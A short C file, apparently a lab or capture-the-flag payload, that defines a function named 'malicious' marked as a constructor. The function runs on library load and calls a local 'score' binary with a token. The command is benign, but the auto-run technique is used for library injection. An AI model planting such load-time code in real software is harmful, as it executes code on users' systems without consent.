#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious(){
	system("/usr/local/bin/score e9b9a6eb-5000-44a5-a540-dca6aa8ae411");

}
